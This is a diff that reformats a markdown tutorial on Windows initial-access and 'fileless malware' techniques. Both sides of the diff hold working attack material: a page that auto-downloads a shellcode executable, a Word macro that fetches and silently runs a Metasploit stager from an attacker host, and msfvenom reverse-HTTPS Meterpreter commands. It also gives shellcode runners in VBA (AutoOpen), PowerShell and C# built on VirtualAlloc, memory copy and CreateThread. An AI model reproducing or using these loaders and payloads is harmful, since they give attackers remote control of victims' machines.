@@ -51,11 +51,11 @@ window.URL.revokeObjectURL(url);
 </body>
 </html>
 ````
-<br>
-        <h2>Exploitation Tutorial<br>
+<h2>Exploitation Tutorial<br>
 1 ------<br></h2>
-💡The clear purpose of the code is: when someone visits a page like http://192.168.2.3/download.html, a file (e.g., shellcode in .exe format) is automatically downloaded without user interaction (i.e., without needing to click a button).<br>
-                 <h2>....................</h2><br>
+💡The clear purpose of the code is:<br> 
+when someone visits a page like http://192.168.2.3/download.html, a file (e.g., shellcode in .exe format) is automatically downloaded without user interaction (i.e., without needing to click a button).<br>
+                 <h3>....................</h3><br>
 <h2>Scenario 2<br>
 1 ------ Malicious Macro Script</h2>
 
@@ -99,7 +99,7 @@ Victim's machine
 http://192.168.2.3/download.html
 <br>
         <h2>Exploitation Tutorial<br>
-1 ------<br></h2>
+1 ------</h2>
 1. Command: The command first downloads the program (the file msfstaged.exe) from the specified URL to the local path defined in the exepath variable. The downloaded file is saved as msfstaged.exe.<br>
 2. exepath: After the file is downloaded, the Shell exepath, vbHide command runs the saved file (msfstaged.exe), effectively executing it.<br>
 3. hideCmd: is used to hide the file located at the path specified in exepath.<br>
@@ -148,20 +148,23 @@ Then, you use a macro that deletes the meaningless content and replaces it with 
 💡This acts like a "gateway" that gives you access to the objects inside the system.<br>
                  ....................<br>
                  ....................<br>
-<h1>Fileless malware<br></h1>
+<h1 align="center">Fileless malware</h1>
 Fileless malware is a type of malicious software that doesn't get stored as a file on the disk. Instead, it operates directly in memory (RAM), making it harder for traditional antivirus programs to detect.<br>
                            ....................<br>
-Fileless malware with VBA
-Practical explanation   
-1 ------
-$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
-EXITFUNC=thread -f vbapplication -o /mnt/share/vbapplication.txt
-2 ------
-$ cd /mnt/share 
-$ mousepad vbapplication.txt
+<h2>Fileless malware with VBA<br></h2>
+<h2>Practical explanation<br>  
+1 ------</h2><br>
+$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443 
+EXITFUNC=thread -f vbapplication -o /mnt/share/vbapplication.txt<br>  
+<h2>2 ------</h2><br>  
+$ cd /mnt/share <br>  
+<br>  
+$ mousepad vbapplication.txt<br>   
+<br>  
+Take all the contents of the file and place them in the code ⬇️.<br>  
+<h2>3 ------</h2><br>  
 
-Take all the contents of the file and place them in the code ⬇️ .
-3 ------
+````
 Private Declare Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef Threadid As Long) As Long
 
 Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
@@ -192,37 +195,40 @@ End Sub
 Sub AutoOpen()
     MyMacro
 End Sub
-
-        Exploitation Tutorial
-1 ------
-This code relies on three different Windows API functions, which are:
-
-1. VirtualAlloc
-Purpose:
-Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.
----
-2. RtlMoveMemory
-Purpose:
-Copies the shellcode (or any data) into the allocated memory space.
----
-3. CreateThread
-Purpose:
-Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.
+````````
+<h2>Exploitation Tutorial<br>  
+1 ------<br></h2>
+This code relies on three different Windows API functions, which are:<br>
+<br>
+1. VirtualAlloc<br>
+Purpose:<br>
+Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.<br>
+---<br>
+2. RtlMoveMemory<br>
+Purpose:<br>
+Copies the shellcode (or any data) into the allocated memory space.<br>
+---<br>
+3. CreateThread<br>
+Purpose:<br>
+Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
+                           ....................<br>
+💡You can shorten this code using msfvenom from Metasploit by generating a payload in the VBA format instead of vbapplication.<br>
+This format can be used to embed the malicious code inside a Word document (for example) through a VBA macro, allowing the code to execute automatically when the macro is enabled.<br>
                            ....................
-💡You can shorten this code using msfvenom from Metasploit by generating a payload in the VBA format instead of vbapplication. This format can be used to embed the malicious code inside a Word document (for example) through a VBA macro, allowing the code to execute automatically when the macro is enabled.
                            ....................
-                           ....................
-Fileless malware with PowerShell 
-Practical explanation   
-1 ------Payload Generation
+<h2>Fileless malware with PowerShell</h2><br> 
+<h2>Practical explanation<br>   
+1 ------Payload Generation</h2><br>
 $ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
-EXITFUNC=thread -f ps1 -o /mnt/share/ps1.txt
-2 ------Shellcode Extraction
-$ cd /mnt/share 
-$ mousepad ps1.txt
+EXITFUNC=thread -f ps1 -o /mnt/share/ps1.txt<br>
+<h2>2 ------Shellcode Extraction</h2><br>
+$ cd /mnt/share <br>
+$ mousepad ps1.txt<br>
+<br>
+Take all the contents of the file and place them in the code ⬇️.<br>
+<h2>3 ------Fileless VBA Execution</h2><br>
 
-Take all the contents of the file and place them in the code ⬇️ .
-3 ------Fileless VBA Execution
+````
 $Kerne132 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -249,35 +255,37 @@ $size = $buf.Length
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 $thandle=[Kernel32]::CreateThread(0,0, $addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
- 
-        Exploitation Tutorial
-1 ------
-This code relies on three different Windows API functions, which are:
-
-1. VirtualAlloc
-Purpose:
-Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.
----
-2. Marshal.Copy
-Purpose:
-Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.
----
-3. CreateThread
-Purpose:
-Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.
-                           ....................
-                           ....................
-Fileless malware with csharp C#
-Practical explanation   
-1 ------Payload Generation
+ ````
+<h2>Exploitation Tutorial<br>
+1 ------</h2><br>
+This code relies on three different Windows API functions, which are:<br>
+<br>
+1. VirtualAlloc<br>
+Purpose:<br>
+Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.<br>
+---<br>
+2. Marshal.Copy<br>
+Purpose:<br>
+Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.<br>
+---<br>
+3. CreateThread<br>
+Purpose:<br>
+Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
+                           ....................<br>
+                           ....................<br>
+<h2>Fileless malware with csharp C#</h2><br>
+<h2>Practical explanation<br>   
+1 ------Payload Generation</h2><br>
 $ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
-EXITFUNC=thread -f csharp -o /mnt/share/csharp.txt
-2 ------Shellcode Extraction
-$ cd /mnt/share 
-$ mousepad csharp.txt
+EXITFUNC=thread -f csharp -o /mnt/share/csharp.txt<br>
+<h2>2 ------Shellcode Extraction</h2><br>
+$ cd /mnt/share <br>
+$ mousepad csharp.txt<br>
+<br>
+Take all the contents of the file and place them in the code ⬇️.<br>
+<h2>3 ------Fileless C# Execution</h2><br>
 
-Take all the contents of the file and place them in the code ⬇️ .
-3 ------Fileless C# Execution
+````
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -310,87 +318,95 @@ namespace ConsoleApp1
         }
     }
 }
-        Exploitation Tutorial
-1 ------
-This code relies on three different Windows API functions, which are:
+````
+<h2>Exploitation Tutorial<br>
+1 ------</h2><br>
+This code relies on three different Windows API functions, which are:<br>
+<br>
+1. VirtualAlloc<br>
+Purpose:<br>
+Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.<br>
+---<br>
+2. Marshal.Copy<br>
+Purpose:<br>
+Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.<br>
+---<br>
+3. CreateThread<br>
+Purpose:<br>
+Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
+                 ....................<br>
+                 ....................<br>
+<h1 align="center">API</h1><br>        
+<h2>VirtualAlloc</h2><br>  
+The VirtualAlloc function in Windows is used to allocate memory within a process. It takes four main parameters:<br>  
+<br> 
+1. lpAddress: The starting address (use NULL to let the system choose).<br> 
+2. dwSize: The size of memory to allocate (in bytes).<br> 
+3. flAllocationType: The allocation type, like MEM_COMMIT or MEM_RESERVE.<br> 
+4. flProtect: Memory protection, such as PAGE_READWRITE or PAGE_EXECUTE_READWRITE.<br> 
+<br> 
+☢️ To use VirtualAlloc in C#, you need to include the using System;<br> 
+like this:<br> 
+using System;<br> 
+<br> 
+💡In short, VirtualAlloc reserves memory space, and its address is stored in a variable like addr, which is later used as the destination in the coby.marshal function to transfer data from the source.<br> 
 
-1. VirtualAlloc
-Purpose:
-Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.
----
-2. Marshal.Copy
-Purpose:
-Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.
----
-3. CreateThread
-Purpose:
-Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.
-                 ....................
-                 ....................
-                      API
-VirtualAlloc 
-The VirtualAlloc function in Windows is used to allocate memory within a process. It takes four main parameters:
+````
+IntPtr addr = VirtualAlloc (IntPtr. Zero,0x1000, 0x3000, 0x40 )<br>
+````
+....................<br> 
+<h2>Marshal.Copy</h2><br> 
+The coby.marshal function is an API used to copy data from a source to a destination. It takes four main parameters:<br> 
+<br> 
+1. source: The original buffer or payload containing the data to be copied.<br> 
+2. start index: The position within the source where the copy operation should begin.<br> 
+3. destination: The target location where the data will be copied to.<br> 
+4. length: The number of bytes (or the size of the data) to be copied.<br> 
+<br> 
+☢️ To use Marshal.Copy in C#, you need to include the System.Runtime.InteropServices library<br> 
+like this:<br> 
+using System.Runtime.InteropServices;<br> 
+<br> 
+💡In simple terms, this API extracts a portion of the buffer from the source, starting at a specific index and for a defined length, and copies it into the destination.<br> 
 
-1. lpAddress: The starting address (use NULL to let the system choose).
-2. dwSize: The size of memory to allocate (in bytes).
-3. flAllocationType: The allocation type, like MEM_COMMIT or MEM_RESERVE.
-4. flProtect: Memory protection, such as PAGE_READWRITE or PAGE_EXECUTE_READWRITE.
+````
+Marshal.Copy(buf, 0, addr, size);<br>
+```` 
+....................<br> 
+<h2>CreateThread</h2><br> 
+The CreateThread function is used in Windows to create a new thread within the process. It takes 6 main parameters:<br> 
+<br> 
+1. lpThreadAttributes: Specifies security attributes for the thread (typically NULL for default attributes).<br> 
+2. dwStackSize: The size of the memory to be allocated for the thread’s stack.<br> 
+3. lpStartAddress: The address of the function to be executed by the thread.<br> 
+4. lpParameter: A parameter to be passed to the function that the thread will execute.<br> 
+5. dwCreationFlags: Flags that control how the thread is created, such as CREATE_SUSPENDED to start the thread in a suspended state.<br> 
+6. lpThreadId: A pointer to a variable that receives the thread identifier (thread ID) if the function succeeds.<br> 
+<br> 
+☢️ To use CreateThread in C#, you need to include the using System;<br> 
+like this:<br> 
+using System;<br> 
+<br> 
+💡In short, CreateThread is used to create a new thread to execute code asynchronously within the same process.<br>
 
-☢️ To use VirtualAlloc in C#, you need to include the using System;
-like this:
-using System;
-
-💡In short, VirtualAlloc reserves memory space, and its address is stored in a variable like addr, which is later used as the destination in the coby.marshal function to transfer data from the source.
-
-IntPtr addr = VirtualAlloc (IntPtr. Zero,0x1000, 0x3000, 0x40 )
-                           ....................
-Marshal.Copy
-The coby.marshal function is an API used to copy data from a source to a destination. It takes four main parameters:
-
-1. source: The original buffer or payload containing the data to be copied.
-2. start index: The position within the source where the copy operation should begin.
-3. destination: The target location where the data will be copied to.
-4. length: The number of bytes (or the size of the data) to be copied.
-
-☢️ To use Marshal.Copy in C#, you need to include the System.Runtime.InteropServices library
-like this:
-using System.Runtime.InteropServices;
-
-💡In simple terms, this API extracts a portion of the buffer from the source, starting at a specific index and for a defined length, and copies it into the destination.
-
-Marshal.Copy(buf, 0, addr, size);
-                           ....................
-CreateThread
-The CreateThread function is used in Windows to create a new thread within the process. It takes 6 main parameters:
-
-1. lpThreadAttributes: Specifies security attributes for the thread (typically NULL for default attributes).
-2. dwStackSize: The size of the memory to be allocated for the thread’s stack.
-3. lpStartAddress: The address of the function to be executed by the thread.
-4. lpParameter: A parameter to be passed to the function that the thread will execute.
-5. dwCreationFlags: Flags that control how the thread is created, such as CREATE_SUSPENDED to start the thread in a suspended state.
-6. lpThreadId: A pointer to a variable that receives the thread identifier (thread ID) if the function succeeds.
-
-☢️ To use CreateThread in C#, you need to include the using System;
-like this:
-using System;
-
-💡In short, CreateThread is used to create a new thread to execute code asynchronously within the same process.
-
+````
 intPtr hthread = CreateThread (IntPtr. Zero, 0, addr, IntPtr. Zero, 0, IntPtr. Zero);
-                           ....................
-💡Summary 
+````
+....................<br> 
+<h2>💡Summary</h2><br> 
+1. VirtualAlloc: Reserves space in the memory within the process's virtual address space.<br> 
+2. coby.marshal: Copies the payload to the reserved memory space allocated by VirtualAlloc.<br> 
+3. CreateThread: Creates a new thread that executes the code (payload) copied into the reserved memory, running concurrently with the original process.<br> 
+<br> 
+Example:<br> 
 
-1. VirtualAlloc: Reserves space in the memory within the process's virtual address space.
-2. coby.marshal: Copies the payload to the reserved memory space allocated by VirtualAlloc.
-3. CreateThread: Creates a new thread that executes the code (payload) copied into the reserved memory, running concurrently with the original process.
-
-Example:
+````
 byte[] buf = new byte (payload)
 int size = buf.Length;
 IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 Marshal.Copy(buf, 0, addr, size);
 IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-💡So, the payload is loaded and executed asynchronously using a new thread, allowing the injected code to run while the original process continues to operate.
+````
+💡So, the payload is loaded and executed asynchronously using a new thread, allowing the injected code to run while the original process continues to operate.<br> 
                            ..................<b/>
                            
